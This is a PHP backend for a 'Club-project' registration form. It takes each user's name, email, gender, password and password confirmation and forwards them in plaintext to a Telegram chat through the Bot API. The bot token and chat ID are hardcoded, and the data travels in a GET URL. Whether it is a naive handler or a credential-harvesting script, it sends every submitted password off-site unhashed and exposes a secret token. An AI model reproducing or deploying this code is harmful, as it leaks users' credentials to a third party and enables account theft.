<?php
 
  const TOKEN = '7367612942:AAFI0FQzQZjrFndp0brU65lOVnToSFiEkiA';
 
  const CHATID = '-4138443533';
 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
   
  if (!empty($_POST['user']) && !empty($_POST['email']) && !empty($_POST['select']) && !empty($_POST['password']) && !empty($_POST['password_conf']) & !empty($_POST['checkbox'])) {
     
    $txt = "Club-project%0AРегистрация нового пользователя%0A%0A";
     
    if (isset($_POST['user']) && !empty($_POST['user'])) {
        $txt .= "Имя: " . strip_tags(trim(urlencode($_POST['user']))) . "%0A";
    }
     
    if (isset($_POST['email']) && !empty($_POST['email'])) {
        $txt .= "Почта: " . strip_tags(urlencode($_POST['email'])) . "%0A";
    }

    if (isset($_POST['select']) && !empty($_POST['select'])) {
      $txt .= "Пол: " . strip_tags(urlencode($_POST['select'])) . "%0A";
  }

    if (isset($_POST['password']) && !empty($_POST['password'])) {
      $txt .= "Пароль: " . strip_tags(urlencode($_POST['password'])) . "%0A";
  }

    if (isset($_POST['password_conf']) && !empty($_POST['password_conf'])) {
      $txt .= "Подтверждение пароля: " . strip_tags(urlencode($_POST['password_conf'])) . "%0A";
  }

  if (isset($_POST['checkbox']) && !empty($_POST['checkbox'])) {
    $txt .= "Согласие с политикой: " . strip_tags(urlencode($_POST['checkbox'])) . "%0A";
  }


    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  } else {
    echo json_encode('NOTVALID');
  }
} else {
  header("Location: /");
}